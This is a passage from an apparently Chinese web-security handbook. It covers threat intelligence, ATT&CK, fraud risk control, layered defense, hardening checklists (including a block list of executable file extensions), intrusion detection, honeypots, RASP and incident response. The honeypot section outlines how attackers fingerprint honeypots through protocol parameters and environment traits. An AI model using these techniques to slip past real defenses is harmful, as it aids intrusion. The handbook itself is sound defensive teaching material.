href='https://mp.weixin.qq.com/s/rc6X5SlsoRp6s7RCEZ67mA'><span>小步快跑，快速迭代：安全运营的器术法道</span></a></li></ul><h4 id='资产管理-1'><span>资产管理</span></h4><ul><li><p><a href='https://mp.weixin.qq.com/s?__biz=MzA5MDY3MzMyOQ%3D%3D&amp;mid=2649439751&amp;idx=1&amp;sn=18ac49aff75ee4b1433e429df56ba44b'><span>资产管理的难点</span></a></p><ol start='' ><li><h2 id='威胁情报-1'><span>威胁情报</span></h2><ol start='' ><li><h3 id='简介-35'><span>简介</span></h3></li></ol></li></ol></li></ul><h4 id='产生原因'><span>产生原因</span></h4><blockquote><p><span>新一代的攻击者常常向企业和组织发起针对性的网络攻击，这种针对性强的攻击，一般经过了精心的策划，攻击方法、途径复杂，后果严重。在面对这种攻击时，攻防存在着严重的不对等，为了尽可能消除这种不对等，威胁情报 (Threat Intelligence) 应运而生。</span></p></blockquote><h4 id='定义'><span>定义</span></h4><blockquote><p><span>威胁情报 (Threat Intelligence)，也被称作安全情报 (Security Intelligence)、安全威胁情报 (Security Threat Intelligence)。</span></p><p><span>关于威胁情报的定义有很多，一般是指从安全数据中提炼的，与网络空间威胁相关的信息，包括威胁来源、攻击意图、攻击手法、攻击目标信息，以及可用于解决威胁或应对危害的知识。广义的威胁情报也包括情报的加工生产、分析应用及协同共享机制。相关的概念有资产、威胁、脆弱性等，具体定义如下。</span></p><p><span>一般威胁情报需要包含威胁源、攻击目的、攻击对象、攻击手法、漏洞、攻击特征、防御措施等。威胁情报在事前可以起到预警的作用，在威胁发生时可以协助进行检测和响应，在事后可以用于分析和溯源。</span></p><p><span>常见的网络威胁情报服务有黑客或欺诈团体分析、社会媒体和开源信息监控、定向漏洞研究、定制的人工分析、实时事件通知、凭据恢复、事故调查、伪造域名检测等。</span></p><p><span>在威胁情报方面，比较有代表性的厂商有 BAE Systems Applied Intelligence、Booz Allen、RSA、IBM、 McAfee、赛门铁克、FireEye 等。</span></p></blockquote><h3 id='相关概念'><span>相关概念</span></h3><h4 id='资产-asset'><span>资产 (Asset)</span></h4><blockquote><p><span>对组织具有价值的信息或资源，属于内部情报，通过资产测绘等方式发现。</span></p></blockquote><h4 id='威胁-threat'><span>威胁 (Threat)</span></h4><blockquote><p><span>能够通过未授权访问、毁坏、揭露、数据修改和或拒绝服务对系统造成潜在危害的起因，威胁可由威胁的主体 (威胁源)、能力、资源、动机、途径、可能性和后果等多种属性来刻画</span></p></blockquote><h4 id='脆弱性--漏洞-vulnerability'><span>脆弱性 / 漏洞 (Vulnerability)</span></h4><blockquote><p><span>可能被威胁如攻击者利用的资产或若干资产薄弱环节。</span></p><p><span>漏洞存在多个周期，最开始由安全研究员或者攻击者发现，而后出现在社区公告/官方邮件/博客中。随着信息的不断地传递，漏洞情报出现在开源社区等地方，并带有 PoC 和漏洞细节分析。再之后出现自动化工具开始大规模传播，部分漏洞会造成社会影响并被媒体报道，最后漏洞基本修复。</span></p></blockquote><h4 id='风险-risk'><span>风险 (Risk)</span></h4><blockquote><p><span>威胁利用资产或一组资产的脆弱性对组织机构造成伤害的潜在可能。</span></p></blockquote><h4 id='安全事件-event'><span>安全事件 (Event)</span></h4><blockquote><p><span>威胁利用资产的脆弱性后实际产生危害的情景。</span></p></blockquote><h3 id='情报来源'><span>情报来源</span></h3><blockquote><p><span>为了实现情报的同步和交换，各组织都制定了相应的标准和规范。主要有国标，美国联邦政府标准等。</span></p><p><span>除了国家外，企业也有各自的情报来源，例如厂商、CERT、开发者社区、安全媒体、漏洞作者或团队、公众号、个人博客、代码仓库等。</span></p></blockquote><h3 id='威胁框架'><span>威胁框架</span></h3><blockquote><p><span>比较有影响力的威胁框架主要有洛克希德-马丁的杀伤链框架 (Cyber Kill Chain Framework)、MITRE 的 ATT&amp;CK 框架 (Common Knowledge base of Adversary Tactics and Techniques)、ODNI 的 CCTF 框架 (Common Cyber Threat Framework，公共网空威胁框架)，以及 NSA 的TCTF 框架(Technical Cyber Threat Framework，技术性网空威胁框架)。</span></p></blockquote><ol start='5' ><li><h3 id='参考链接-参考链接-39'><span>参考链接 {#参考链接-39}</span></h3><ul><li><a href='https://scadahacker.com/library/Documents/Threat_Intelligence/iSight%20Partners%20-%20Executive%20Perspectives%20on%20Cyber%20Threat%20Intelligence.pdf'><span>Executive Perspectives on Cyber Threat Intelligence</span></a></li><li><a href='https://www.darkreading.com/analytics/threat-intelligence/cyber-threats-information-vs-intelligence/a/d-id/1316851'><span>Cyber Threats: Information vs. Intelligence</span></a></li><li><a href='https://www.freebuf.com/column/136763.html'><span>威胁情报简介及市场浅析</span></a></li></ul></li></ol><p>&nbsp;</p><ol start='4' ><li><strong><span>威胁情报</span></strong><span> </span><strong><span>281</span></strong></li></ol><p>&nbsp;</p><ol start='2' ><li><h1 id='attck'><span>ATT&amp;CK</span></h1><ol start='' ><li><h3 id='简介-36'><span>简介</span></h3></li></ol></li></ol><blockquote><p><span>MITRE 是美国政府资助的一家研究机构，该公司于 1958 年从 MIT 分离出来，并参与了许多商业和最高机密项目。其中包括开发 FAA 空中交通管制系统和 AWACS 机载雷达系统。MITRE 在美国国家标准技术研究所 (NIST) 的资助下从事了大量的网络安全实践。</span></p><p><span>MITRE 在 2013 年推出了 ATT&amp;CK™ 模型，它的全称是 Adversarial Tactics, Techniques, and Common Knowledge (ATT&amp;CK)，它是一个站在攻击者的视角来描述攻击中各阶段用到的技术的模型。将已知攻击者行为转换为结构化列表，将这些已知的行为汇总成战术和技术，并通过几个矩阵以及结构化威胁信息表达式 (STIX)、指标信息的可信自动化交换 (TAXII) 来表示。由于此列表相当全面地呈现了攻击者在攻击网络时所采用的行为，因此对于各种进攻性和防御性度量、表示和其他机制都非常有用。多用于模拟攻击、评估和提高防御能力、威胁情报提取和建模、威胁评估和分析。</span></p><p><span>官方对 ATT&amp;CK 的描述是：</span></p><p><span>和 Kill Chain 等模型相比，ATT&amp;CK 的抽象程度会低一些，但是又比普通的利用和漏洞数据库更高。MITRE公司认为，Kill Chain 在高维度理解攻击过程有帮助，但是无法有效描述对手在单个漏洞的行为。</span></p><p><span>目前 ATT&amp;CK 模型分为三部分，分别是 PRE-ATT&amp;CK，ATT&amp;CK for Enterprise(包括 Linux、macOS、 Windows) 和 ATT&amp;CK for Mobile(包括 iOS、Android)，其中 PRE-ATT&amp;CK 覆盖攻击链模型的前两个阶段 (侦察跟踪、武器构建)，ATT&amp;CK for Enterprise 覆盖攻击链的后五个阶段 (载荷传递、漏洞利用、安装植入、命令与控制、目标达成)，ATT&amp;CK Matrix for Mobile 主要针对移动平台。</span></p><p><span>PRE-ATT&amp;CK 包括的战术有优先级定义、选择目标、信息收集、发现脆弱点、攻击性利用开发平台、建立和维护基础设施、人员的开发、建立能力、测试能力、分段能力。</span></p><p><span>ATT&amp;CK for Enterprise 包括的战术有访问初始化、执行、常驻、提权、防御规避、访问凭证、发现、横向移动、收集、数据获取、命令和控制。</span></p></blockquote><h3 id='ttp'><span>TTP</span></h3><blockquote><p><span>MITRE 在定义 ATT&amp;CK 时，定义了一些关键对象：组织 (Groups)、软件 (Software)、技术 (Techniques)、战术 (Tactics)。</span></p><p><span>其中组织使用战术和软件，软件实现技术，技术实现战术。例如 APT28(组织) 使用 Mimikatz(软件) 达到了获得登录凭证的效果 (技术) 实现了以用户权限登录的目的 (战术)。整个攻击行为又被称为 TTP，是战术、技术、过程的集合。</span></p></blockquote><ol start='3' ><li><h3 id='参考链接-参考链接-40'><span>参考链接 {#参考链接-40}</span></h3><ul><li><a href='https://attack.mitre.org/'><span>Mitre ATT&amp;CK</span></a></li><li><a href='https://github.com/mitre/advmlthreatmatrix'><span>Adversarial Threat Matrix</span></a></li><li><a href='https://www.mitre.org/sites/default/files/publications/pr-18-0944-11-mitre-attack-design-and-philosophy.pdf'><span>MITRE ATT&amp;CK：Design and Philosophy</span></a></li><li><a href='https://bbs.pediy.com/thread-254825.htm'><span>ATT&amp;CK 一般性学习笔记</span></a></li><li><a href='https://github.com/mitre/cti'><span>Cyber Threat Intelligence Repository expressed in STIX 2.0</span></a></li><li><a href='https://github.com/Neo23x0/sigma'><span>sigma</span></a><span> Generic Signature Format for SIEM Systems</span></li><li><a href='https://github.com/mitre/caldera'><span>caldera</span></a><span> Automated Adversary Emulation</span></li><li><a href='https://github.com/endgameinc/RTA'><span>RTA</span></a><span> Red Team Automation</span></li></ul></li></ol><p>&nbsp;</p><ol start='3' ><li><h2 id='风险控制-1'><span>风险控制</span></h2><ol start='' ><li><h3 id='常见风险'><span>常见风险</span></h3><ul><li><strong><span>会员</span></strong></li><li><strong><span>视频</span></strong></li><li><strong><span>活动</span></strong></li><li><strong><span>直播</span></strong></li><li><strong><span>电商</span></strong></li></ul></li></ol></li></ol><ul><li><p><span>撞库盗号</span></p></li><li><p><span>账号分享</span></p></li><li><p><span>批量注册</span></p></li><li><p><span>盗播盗看</span></p></li><li><p><span>广告屏蔽</span></p></li><li><p><span>刷量作弊</span></p></li><li><p><span>恶意刷</span></p></li><li><p><span>薅羊毛</span></p></li><li><p><span>挂站人气</span></p></li><li><p><span>恶意图文</span></p></li><li><p><span>恶意下单</span></p></li><li><p><span>订单欺诈</span></p><ol start='7' ><li><strong><span>风险控制</span></strong><span> </span><strong><span>283</span></strong></li></ol></li></ul><p>&nbsp;</p><ul><li><strong><span>支付</span></strong></li><li><strong><span>其他</span></strong></li></ul><p>&nbsp;</p><ul><li><p><span>盗号盗卡</span></p></li><li><p><span>洗钱</span></p></li><li><p><span>恶意下单</span></p></li><li><p><span>恶意提现</span></p></li><li><p><span>钓鱼邮件</span></p></li><li><p><span>恶意爆破</span></p></li><li><p><span>短信轰炸</span></p><ol start='' ><li><h3 id='防御策略'><span>防御策略</span></h3><ul><li><h4 id='核身策略'><span>核身策略</span></h4><ul><li><span>同一收货手机号</span></li><li><span>同一收货地址</span></li><li><span>同一历史行为</span></li><li><span>同一 IP</span></li><li><span>同一设备</span></li><li><span>同一支付 ID</span></li><li><span>LBS</span></li></ul></li></ul></li><li><h3 id='异常特征'><span>异常特征</span></h3><ul><li><h4 id='app-用户异常特征'><span>APP 用户异常特征</span></h4><ul><li><span>IP</span></li><li><span>设备为特定型号</span></li><li><span>本地 APP 列表中有沙盒 APP</span></li><li><span>Root 用户</span></li><li><span>同设备登录过多个账号</span></li></ul></li></ul></li><li><h3 id='参考链接-参考链接-41'><span>参考链接 {#参考链接-41}</span></h3><ul><li><a href='http://doc.cocolian.cn/essay/risk/2016/12/18/risk-2-database/'><span>支付风控模型和流程分析</span></a></li><li><a href='https://mp.weixin.qq.com/s?__biz=MzI0MjczMjM2NA%3D%3D&amp;mid=2247483836&amp;idx=1&amp;sn=d46875c957289d8e035345992ad7053e'><span>爱奇艺业务安全风控体系的建设实践</span></a></li></ul></li></ol><p>&nbsp;</p><ol start='' ><li><h2 id='防御框架'><span>防御框架</span></h2><ol start='' ><li><h3 id='防御纵深'><span>防御纵深</span></h3></li></ol></li></ol></li></ul><blockquote><p><span>根据纵深，防御可以分为物理层、数据层、终端层、系统层、网络层、应用层几层。这几层纵深存在层层递进相互依赖的关系。</span></p></blockquote><h4 id='物理层-2'><span>物理层</span></h4><blockquote><p><span>物理层实际应用中接触较少，但仍是非常重要的位置。如果物理层设计不当，很容易被攻击者通过物理手段绕过上层防御。</span></p></blockquote><h4 id='数据层'><span>数据层</span></h4><blockquote><p><span>数据处于防御纵深较底层的位置，攻击的目标往往也是为了拿到数据，很多防御也是围绕数据不被破坏、窃取等展开的。</span></p></blockquote><h4 id='终端层'><span>终端层</span></h4><blockquote><p><span>终端包括 PC、手机、IoT 以及其他的智能设备，连入网络的终端是否可信是需要解决的问题。</span></p></blockquote><h4 id='系统层'><span>系统层</span></h4><blockquote><p><span>操作系统运行在终端上，可能会存在提权、非授权访问等问题。</span></p></blockquote><h4 id='网络层-2'><span>网络层</span></h4><blockquote><p><span>网络层使用通信线路将多台计算机相互连接起来，依照商定的协议进行通信。网络层存在 MITM、DDoS 等攻击。</span></p></blockquote><h4 id='应用层-2'><span>应用层</span></h4><blockquote><p><span>应用层是最上层，主要涉及到 Web 应用程序的各种攻击。</span></p></blockquote><ol start='7' ><li><p><strong><span>防御框架</span></strong><span> </span><strong><span>285</span></strong></p><ol start='' ><li><h3 id='访问控制-1'><span>访问控制</span></h3></li></ol></li></ol><blockquote><p><span>Web 应用需要限制用户对应用程序的数据和功能的访问，以防止用户未经授权访问。访问控制的过程可以分为验证、会话管理和访问控制三个地方。</span></p></blockquote><h4 id='验证机制'><span>验证机制</span></h4><blockquote><p><span>验证机制在一个应用程序的用户访问处理中是一个最基本的部分，验证就是确定该用户的有效性。大多数的 web 应用都采用使用的验证模型，即用户提交一个用户名和密码，应用检查它的有效性。在银行等安全性很重要的应用程序中，基本的验证模型通常需要增加额外的证书和多级登录过程，比如客户端证书、硬件等。</span></p></blockquote><h4 id='会话管理'><span>会话管理</span></h4><blockquote><p><span>为了实施有效的访问控制，应用程序需要一个方法来识别和处理这一系列来自每个不同用户的请求。大部分程序会为每个会话创建一个唯一性的 token 来识别。</span></p><p><span>对攻击者来说，会话管理机制高度地依赖于 token 的安全性。在部分情况下，一个攻击者可以伪装成受害的授权用户来使用 Web 应用程序。这种情况可能有几种原因，其一是 token 生成的算法的缺陷，使得攻击者能够猜测到其他用户的 token；其二是 token 后续处理的方法的缺陷，使得攻击者能够获得其他用户的 token。</span></p></blockquote><h4 id='访问控制-2'><span>访问控制</span></h4><blockquote><p><span>处理用户访问的最后一步是正确决定对于每个独立的请求是允许还是拒绝。如果前面的机制都工作正常，那么应用程序就知道每个被接受到的请求所来自的用户的 id，并据此决定用户对所请求要执行的动作或要访问的数据是否得到了授权。</span></p><p><span>由于访问控制本身的复杂性，这使得它成为攻击者的常用目标。开发者经常对用户会如何与应用程序交互作出有缺陷的假设，也经常省略了对某些应用程序功能的访问控制检查。</span></p></blockquote><h3 id='输入处理'><span>输入处理</span></h3><blockquote><p><span>很多对 Web 应用的攻击都涉及到提交未预期的输入，它导致了该应用程序设计者没有料到的行为。因此，对于应用程序安全性防护的一个关键的要求是它必须以一个安全的方式处理用户的输入。</span></p><p><span>基于输入的漏洞可能出现在一个应用程序的功能的任何地方，并与其使用的技术类型相关。对于这种攻击，输入验证是常用的必要防护。常用的防护机制有如下几种：黑名单、白名单、过滤、处理。</span></p></blockquote><h4 id='黑名单'><span>黑名单</span></h4><blockquote><p><span>黑名单包含已知的被用在攻击方面的一套字面上的字符串或模式，验证机制阻挡任何匹配黑名单的数据。</span></p><p><span>一般来说，这种方式是被认为是输入效果较差的一种方式。主要有两个原因，其一 Web 应用中的一个典型的漏洞可以使用很多种不同的输入来被利用，输入可以是被加密的或以各种不同的方法表示。</span></p><p><span>其二，漏洞利用的技术是在不断地改进的，有关利用已存在的漏洞类型的新的方法不可能被当前黑名单阻挡。</span></p></blockquote><h4 id='白名单'><span>白名单</span></h4><blockquote><p><span>白名单包含一系列的字符串、模式或一套标准来匹配符合要求的输入。这种检查机制允许匹配白名单的数据，阻止之外的任何数据。这种方式相对比较有效，但需要比较好的设计。</span></p></blockquote><h4 id='过滤-1'><span>过滤</span></h4><blockquote><p><img src="media/image1.png" referrerpolicy="no-referrer"><span>过滤会删除潜在的恶意字符并留下安全的字符，基于数据过滤的方式通常是有效的，并 在许多情形中，可作为处理恶意输入的通用解决方案。</span></p></blockquote><h4 id='安全地处理数据'><span>安全地处理数据</span></h4><blockquote><p><span>非常多的 web 应用程序漏洞的出现是因为用户提供的数据是以不安全的方法被处理的。在一些情况下，存在安全的编程方法能够避免通常的问题。例如，SQL 注入攻击能够通过预编译的方式组织，XSS 在大部分情况下能够被转义所防御。</span></p></blockquote><ol start='2' ><li><h2 id='加固检查'><span>加固检查</span></h2><ol start='' ><li><h3 id='网络设备'><span>网络设备</span></h3><ul><li><span>及时检查系统版本号</span></li><li><span>敏感服务设置访问 IP/MAC 白名单</span></li><li><span>开启权限分级控制</span></li><li><span>关闭不必要的服务</span></li><li><span>打开操作日志</span></li><li><span>配置异常告警</span></li><li><span>关闭 ICMP 回应</span></li></ul></li><li><h3 id='操作系统'><span>操作系统</span></h3></li></ol></li></ol><h4 id='linux-2'><span>Linux</span></h4><ul><li><p><span>无用用户/用户组检查</span></p></li><li><p><span>空口令帐号检查</span></p></li><li><h4 id='用户密码策略'><span>用户密码策略</span></h4><ul><li><span>/etc/login.defs</span></li><li><span>/etc/pam.d/system-auth</span></li></ul></li><li><h4 id='敏感文件权限配置'><span>敏感文件权限配置</span></h4><ul><li><span>/etc/passwd</span></li><li><span>/etc/shadow</span></li></ul></li></ul><blockquote><p><strong>–</strong><span> </span><span>~</span><span>/.ssh/</span></p></blockquote><ul><li><span>/var/log/messages</span></li><li><span>/var/log/secure</span></li><li><span>/var/log/maillog</span></li><li><span>/var/log/cron</span></li><li><span>/var/log/spooler</span></li><li><span>/var/log/boot.log</span></li></ul><p>&nbsp;</p><ul><li><p><span>日志是否打开</span></p></li><li><p><span>及时安装补丁</span></p></li><li><h4 id='开机自启'><span>开机自启</span></h4><ul><li><span>/etc/init.d</span></li></ul></li><li><p><span>检查系统时钟</span></p></li></ul><h4 id='windows-3'><span>Windows</span></h4><ul><li><p><span>异常进程监控</span></p></li><li><p><span>异常启动项监控</span></p></li><li><p><span>异常服务监控</span></p></li><li><p><span>配置系统日志</span></p></li><li><h4 id='用户账户'><span>用户账户</span></h4><ul><li><span>设置口令有效期</span></li><li><span>设置口令强度限制</span></li><li><span>设置口令重试次数</span></li></ul></li><li><p><span>安装 EMET</span></p></li><li><p><span>启用 PowerShell 日志</span></p></li><li><h4 id='限制以下敏感文件的下载和执行'><span>限制以下敏感文件的下载和执行</span></h4><ul><li><span>ade, adp, ani, bas, bat, chm, cmd, com, cpl, crt, hlp, ht, hta, inf, ins, isp, job, js, jse, lnk, mda, mdb, mde, mdz, msc, msi, msp, mst, pcd, pif, reg, scr, sct, shs, url, vb, vbe, vbs, wsc, wsf, wsh, exe, pif</span></li></ul></li><li><h4 id='限制会调起-wscript-的后缀'><span>限制会调起 wscript 的后缀</span></h4><ul><li><span>bat, js, jse, vbe, vbs, wsf, wsh</span></li></ul></li><li><h4 id='域-2'><span>域</span></h4><ul><li><span>限制将计算机加入域的权限</span></li><li><span>域账户使用最小权限原则</span></li><li><span>减少非必要高权限账户的数量</span></li></ul></li></ul><h3 id='应用'><span>应用</span></h3><h4 id='ftp'><span>FTP</span></h4><ul><li><span>禁止匿名登录</span></li><li><span>修改 Banner</span></li></ul><h4 id='ssh'><span>SSH</span></h4><ul><li><span>是否禁用 ROOT 登录</span></li><li><span>是否禁用密码连接</span></li></ul><h4 id='mysql-2'><span>MySQL</span></h4><ul><li><span>文件写权限设置</span></li><li><span>用户授权表管理</span></li><li><span>日志是否启用</span></li><li><span>版本是否最新</span></li></ul><h3 id='web-中间件'><span>Web 中间件</span></h3><h4 id='apache'><span>Apache</span></h4><ul><li><p><span>版本号隐藏</span></p></li><li><p><span>版本是否最新</span></p></li><li><p><span>禁用部分 HTTP 动词</span></p></li><li><p><span>关闭 Trace</span></p></li><li><p><span>禁止 server-status</span></p></li><li><p><span>上传文件大小限制</span></p></li><li><p><span>目录权限设置</span></p></li><li><p><span>是否允许路由重写</span></p></li><li><p><span>是否允许列目录</span></p></li><li><p><span>日志配置</span></p></li><li><p><span>配置超时时间防 DoS</span></p></li><li><h4 id='非属主用户文件读写限制'><span>非属主用户文件读写限制</span></h4><ul><li><span>httpd.conf</span></li><li><span>access.log</span></li><li><span>error.log</span></li></ul></li></ul><h4 id='nginx'><span>Nginx</span></h4><ul><li><span>禁用部分 HTTP 动词</span></li><li><span>禁用目录遍历</span></li><li><span>检查重定向配置</span></li><li><span>配置超时时间防 DoS</span></li></ul><h4 id='iis'><span>IIS</span></h4><ul><li><span>版本是否最新</span></li><li><span>日志配置</span></li><li><span>用户口令配置</span></li><li><span>ASP.NET 功能配置</span></li><li><span>配置超时时间防 DoS</span></li></ul><h4 id='jboss-2'><span>JBoss</span></h4><ul><li><span>jmx console 配置</span></li><li><span>web console 配置</span></li></ul><h4 id='tomcat-2'><span>Tomcat</span></h4><ul><li><span>禁用部分 HTTP 动词</span></li><li><span>禁止列目录</span></li><li><span>禁止 manager 功能</span></li><li><span>用户密码配置</span></li><li><span>用户权限配置</span></li><li><span>配置超时时间防 DoS</span></li></ul><ol start='5' ><li><h3 id='密码管理策略'><span>密码管理策略</span></h3><ul><li><span>长度不少于 8 个字符</span></li><li><span>不存在于已有字典之中</span></li><li><span>不使用基于知识的认证方式</span></li></ul></li><li><h3 id='参考链接-参考链接-42'><span>参考链接 {#参考链接-42}</span></h3><ul><li><a href='https://github.com/PaulSec/awesome-windows-domain-hardening'><span>awesome windows domain hardening</span></a></li><li><a href='https://docs.microsoft.com/zh-cn/windows/security/threat-protection/microsoft-defender-atp/customize-attack-surface-reduction'><span>customize attack surface reduction</span></a></li></ul></li></ol><p>&nbsp;</p><ol start='3' ><li><h2 id='入侵检测'><span>入侵检测</span></h2><ol start='' ><li><h3 id='ids-与-ips'><span>IDS 与 IPS</span></h3></li></ol></li></ol><blockquote><p><span>IDS 与 IPS 是常见的防护设备，IPS 相对 IDS 的不同点在于，IPS 通常具有阻断能力。</span></p></blockquote><ol start='2' ><li><h3 id='常见入侵点'><span>常见入侵点</span></h3><ul><li><span>Web 入侵</span></li><li><span>高危服务入侵</span></li></ul></li><li><h3 id='监控实现'><span>监控实现</span></h3></li></ol><h4 id='客户端监控'><span>客户端监控</span></h4><ul><li><span>监控敏感配置文件</span></li></ul><h4 id='810-入侵检测-291'><span>8.10. 入侵检测 291</span></h4><ul><li><p><strong><span>常用命令 ELF 文件完整性监控</span></strong></p><ul><li><span>ps</span></li><li><span>lsof</span></li></ul></li></ul><blockquote><p><strong>–</strong><span> </span><span>.</span><span>..</span></p></blockquote><ul><li><p><span>rootkit 监控</span></p></li><li><h4 id='资源使用报警'><span>资源使用报警</span></h4><ul><li><span>内存使用率</span></li><li><span>CPU 使用率</span></li><li><span>IO 使用率</span></li><li><span>网络使用率</span></li></ul></li><li><p><span>新出现进程监控</span></p></li><li><p><span>基于 inotify 的文件监控</span></p></li></ul><h4 id='网络检测'><span>网络检测</span></h4><blockquote><p><span>基于网络层面的攻击向量做检测，如 Snort 等。</span></p></blockquote><h4 id='日志分析-1'><span>日志分析</span></h4><blockquote><p><span>将主机系统安全日志/操作日志、网络设备流量日志、Web 应用访问日志、SQL 应用访问日志等日志集中到一个统一的后台，在后台中对各类日志进行综合的分析。</span></p></blockquote><ol start='' ><li><h3 id='参考链接-参考链接-43'><span>参考链接 {#参考链接-43}</span></h3><ul><li><a href='https://www.freebuf.com/articles/es/194510.html'><span>企业安全建设之 HIDS</span></a></li><li><a href='https://xz.aliyun.com/t/1626/'><span>大型互联网企业入侵检测实战总结</span></a></li><li><a href='https://mp.weixin.qq.com/s/kzeAEvz-ejLD71fgb5t8tA'><span>同程入侵检测系统</span></a></li><li><a href='https://xz.aliyun.com/t/2136'><span>Web 日志安全分析系统实践</span></a></li><li><a href='https://xz.aliyun.com/t/1121'><span>Web 日志安全分析浅谈</span></a></li><li><a href='https://mp.weixin.qq.com/s/QJeW7K-KThYHggWtJ-Fh3w'><span>网络层绕过 IDS/IPS 的一些探索</span></a></li></ul></li></ol><p>&nbsp;</p><ol start='' ><li><h2 id='零信任安全'><span>零信任安全</span></h2><ol start='' ><li><h3 id='参考链接-参考链接-44'><span>参考链接 {#参考链接-44}</span></h3><ul><li><a href='https://mp.weixin.qq.com/s/Fd0iKkGgE6Y1e81tP3MJFQ'><span>美国国防部零信任的支柱</span></a></li></ul></li></ol></li><li><h2 id='蜜罐技术'><span>蜜罐技术</span></h2><ol start='' ><li><h3 id='简介-37'><span>简介</span></h3></li></ol></li></ol><blockquote><p><span>蜜罐是对攻击者的欺骗技术，用以监视、检测、分析和溯源攻击行为，其没有业务上的用途，所有流入/流出蜜罐的流量都预示着扫描或者攻击行为，因此可以比较好的聚焦于攻击流量。</span></p><p><span>蜜罐可以实现对攻击者的主动诱捕，能够详细地记录攻击者攻击过程中的许多痕迹，可以收集到大量有价值的数据，如病毒或蠕虫的源码、黑客的操作等，从而便于提供丰富的溯源数据。另外蜜罐也可以消耗攻击者的时间，基于 JSONP 等方式来获取攻击者的画像。</span></p><p><span>但是蜜罐存在安全隐患，如果没有做好隔离，可能成为新的攻击源。</span></p></blockquote><h3 id='分类-2'><span>分类</span></h3><blockquote><p><span>按用途分类，蜜罐可以分为研究型蜜罐和产品型蜜罐。研究型蜜罐一般是用于研究各类网络威胁，寻找应对的方式，不增加特定组织的安全性。产品型蜜罐主要是用于防护的商业产品。</span></p><p><span>按交互方式分类，蜜罐可以分为低交互蜜罐和高交互蜜罐。低交互蜜罐模拟网络服务响应和攻击者交互，容易部署和控制攻击，但是模拟能力会相对较弱，对攻击的捕获能力不强。高交互蜜罐不是简单模拟协议或服务，而是提供真实的系统，使得被发现的概率大幅度降低。但是高交互蜜罐部署不当时存在被攻击者利用的可能性。</span></p></blockquote><h3 id='隐藏技术'><span>隐藏技术</span></h3><blockquote><p><span>蜜罐主要涉及到的是伪装技术，主要涉及到进程隐藏、服务伪装等技术。</span></p><p><span>蜜罐之间的隐藏，要求蜜罐之间相互隐蔽。进程隐藏，蜜罐需要隐藏监控、信息收集等进程。伪服务和命令技术，需要对部分服务进行伪装，防止攻击者获取敏感信息或者入侵控制内核。数据文件伪装，需要生成合理的虚假数据的文件。</span></p></blockquote><h3 id='识别技术'><span>识别技术</span></h3><blockquote><p><img src="media/image1.png" referrerpolicy="no-referrer"><span>攻击者也会尝试对蜜罐进行识别。比较容易的识别的是低交互的蜜罐，尝试一些比较复杂 少见的操作能比较容易的识别低交互的蜜罐。相对困难的是高交互蜜罐的识别，因为高交互蜜罐通常以真实系统为基础来构</span></p><p><span>建，和真实系统比较近似。对这种情况，通常会基于虚拟文件系统和注册表的信息、内存分配特征、硬件特征、特殊指令等来识别。</span></p></blockquote><h4 id='协议实现识别'><span>协议实现识别</span></h4><blockquote><p><span>部分蜜罐在实现的过程中，协议的部分参数固定或随机的范围有限，可以通过特定参数的范围来识别蜜罐。部分蜜罐协议支持的版本范围为某一特定版本范围，可以通过对应的版本范围来推测是否为蜜罐。</span></p><p><span>部分蜜罐在交互过程中有探测客户端特征的交互，可以通过这些交互过程来识别蜜罐。部分蜜罐对不正确的请求也返回正常的相应，可以通过这种特征来判定蜜罐。</span></p></blockquote><h4 id='环境特征'><span>环境特征</span></h4><blockquote><p><span>部分蜜罐的用户名、密码固定，或内存使用、进程占用等动态特征变化较为规律，可以通过这种方式来判断是否为蜜罐。</span></p></blockquote><ol start='5' ><li><h3 id='参考链接-参考链接-45'><span>参考链接 {#参考链接-45}</span></h3><ul><li><a href='https://en.wikipedia.org/wiki/Honeypot%5f%28computing%29'><span>honeypot wiki</span></a></li><li><a href='http://threatstream.github.io/mhn/'><span>Modern Honey Network</span></a></li><li><a href='https://www.moresec.cn/magic-shield.html'><span>默安科技：幻阵</span></a></li><li><a href='https://xz.aliyun.com/t/998'><span>蜜罐与内网安全从 0 到 1</span></a></li><li><a href='https://mp.weixin.qq.com/s?__biz=Mzk0NzE4MDE2NA%3D%3D&amp;mid=2247483908&amp;idx=1&amp;sn=e6a319e22c3cd54650bdbba511e58a43'><span>浅析开源蜜罐识别与全网测绘</span></a></li></ul></li></ol><p>&nbsp;</p><ol start='3' ><li><h1 id='rasp-1'><span>RASP</span></h1><ol start='' ><li><h3 id='简介-38'><span>简介</span></h3></li></ol></li></ol><blockquote><p><span>RASP（Runtime Application Self-Protection）由 Gartner 在 2014 年引入，是一种应用层的安全保护技术。</span></p></blockquote><h3 id='参考链接-参考链接-46'><span>参考链接 {#参考链接-46}</span></h3><h4 id='厂商'><span>厂商</span></h4><ul><li><a href='https://rasp.baidu.com/'><span>OpenRASP</span></a></li><li><a href='https://www.microfocus.com/en-us/products/application-defender/features'><span>Micro Focus</span></a></li><li><a href='https://www.prevoty.com/'><span>Prevoty</span></a></li><li><a href='https://www.waratek.com/application-security-platform/'><span>waratek</span></a></li><li><a href='http://appsensor.org/'><span>OWASP AppSensor</span></a></li><li><a href='https://shadowd.zecure.org/overview/introduction/'><span>Shadowd</span></a></li><li><a href='https://www.immun.io/features'><span>immun</span></a></li><li><a href='https://www.contrastsecurity.com/runtime-application-self-protection-rasp'><span>Contrast Security</span></a></li><li><a href='https://www.signalsciences.com/rasp-runtime-application-self-protection/'><span>Signal Sciences</span></a></li><li><a href='http://www.brixbits.com/security-analyzer.html'><span>BrixBits</span></a></li></ul><h4 id='blog-3'><span>Blog</span></h4><ul><li><a href='https://mp.weixin.qq.com/s/icWaHsC6dzlclxfLhvQjYA'><span>Python RASP 工程化一次入侵的思考</span></a></li><li><a href='https://www.freebuf.com/articles/web/197823.html'><span>浅谈 RASP 技术攻防之基础篇</span></a></li></ul><ol start='4' ><li><h2 id='应急响应'><span>应急响应</span></h2><ol start='' ><li><h3 id='响应流程'><span>响应流程</span></h3></li></ol></li></ol><h4 id='事件发生'><span>事件发生</span></h4><blockquote><p><span>运维监控人员、客服审核人员等发现问题，向上通报。</span></p></blockquote><h4 id='事件确认'><span>事件确认</span></h4><blockquote><p><span>收集事件信息、分析网络活动相关程序，日志和数据，判断事件的严重性，评估出问题的严重等级，是否向上进行汇报等。</span></p></blockquote><h4 id='事件响应'><span>事件响应</span></h4><blockquote><p><span>各部门通力合作，处理安全问题，具体解决问题，避免存在漏洞未修补、后门未清除等残留问题。</span></p></blockquote><h4 id='事件关闭'><span>事件关闭</span></h4><blockquote><p><span>处理完事件之后，需要关闭事件，并写出安全应急处理分析报告，完成整个应急过程。</span></p></blockquote><ol 